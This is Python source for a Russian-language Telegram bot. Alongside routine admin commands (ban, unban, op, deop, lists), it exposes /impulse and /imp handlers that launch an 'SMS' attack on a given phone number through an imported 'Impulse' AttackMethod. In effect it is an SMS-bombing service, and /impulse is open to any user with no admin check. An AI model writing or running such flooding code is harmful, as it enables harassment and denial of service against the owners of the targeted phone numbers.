from main import dp, types, bot
import dictionary
from data.bd_commands import bd_work
from handlers.answer import isBanned
bd = bd_work()


# admin command
@dp.message_handler(commands=['ban'])
async def ban_user(message: types.Message):
    if (str(message.from_user.id) in bd.admins()) and not isBanned(message.from_user.id):
        try:
            abuser_id = int(message.get_args())
        except (ValueError, TypeError):
            return await message.reply("Укажи ID пользователя.")
        bd.add_banlist([abuser_id])
        await message.reply(f"Пользователь {abuser_id} заблокирован.")


# admin command
@dp.message_handler(commands=['unban'])
async def unban_user(message: types.Message):
    if (str(message.from_user.id) in bd.admins()) and not isBanned(message.from_user.id):
        try:
            abuser_id = int(message.get_args())
        except (ValueError, TypeError):
            return await message.reply("Укажи ID пользователя.")
        bd.delete_banlist(abuser_id)
        await message.reply(f"Пользователь {abuser_id} разблокирован.")


@dp.message_handler(commands=['help'])
async def helper(message: types.Message):
    if str(message.from_user.id) in bd.admins():
        await bot.send_message(message.from_user.id, dictionary.admin_help_text)
    else:
        await bot.send_message(message.from_user.id, dictionary.help_text)


@dp.message_handler(commands=['show'])
async def ban_user(message: types.Message):
    await bot.send_message(message.from_user.id, bd.printInfo(bd.get_rooted_user(), 'Список пользователей: '))


@dp.message_handler(commands=['banlist'])
async def show_banned(message: types.Message):
    await bot.send_message(message.from_user.id, bd.printInfo(bd.banlist(), 'Бан лист: '))


@dp.message_handler(commands=['id'])
async def show_id(message: types.Message):
    await bot.send_message(message.from_user.id, "Твой id: " + str(message.from_user.id))


# admin command
@dp.message_handler(commands=['op'])
async def op_user(message: types.Message):
    if (str(message.from_user.id) in bd.admins()) and not isBanned(message.from_user.id):
        try:
            admin_id = int(message.get_args())
        except (ValueError, TypeError):
            return await message.reply("Укажи ID пользователя.")
        bd.add_administrator([admin_id])
        await message.reply(f"Пользователь {admin_id} получает права администратора.\n/help - "
                            f"посмотреть команды администратора")


# admin command
@dp.message_handler(commands=['deop'])
async def op_user(message: types.Message):
    if (str(message.from_user.id) in bd.admins()) and not isBanned(message.from_user.id):
        try:
            admin_id = int(message.get_args())
        except (ValueError, TypeError):
            return await message.reply("Укажи ID пользователя.")
        bd.delete_administrator(admin_id)
        await message.reply(f"Пользователь {admin_id} теряет права администратора")


@dp.message_handler(commands=['oplist'])
async def admin_list(message: types.Message):
    await bot.send_message(message.from_user.id, bd.printInfo(bd.admins(), 'Администраторы: '))


@dp.message_handler(commands=['impulse'])
async def impulse(message: types.Message):
    if message.text == "/impulse":
        return await message.reply("/impulse <номер телефона>")
    await bot.send_message(message.from_user.id, "Атака началась на" + message.text)
    from Impulse.tools.method import AttackMethod
    attack = AttackMethod("SMS", 32, 16, message.text)
    print(attack.getMethod())
    attack.__enter__()
    attack.Start()


# admin command
@dp.message_handler(commands=['imp'])
async def spam(message: types.Message):
    if (str(message.from_user.id) in bd.admins()) and not isBanned(message.from_user.id):
        if message.text == "/imp":
            return await message.reply("/imp <номер телефона> <количество потоков>"
                                       " <продолжительность работы>")
        list = message.text.split()
        await bot.send_message(message.from_user.id, "Атака началась на: " + list[1] + " количество потоков: "
                                + list[2] + " продолжительность: " + list[3] + " секунд")
        from Impulse.tools.method import AttackMethod
        attack = AttackMethod("SMS", int(list[3]), int(list[2]), list[1])
        attack.__enter__()
        attack.Start()
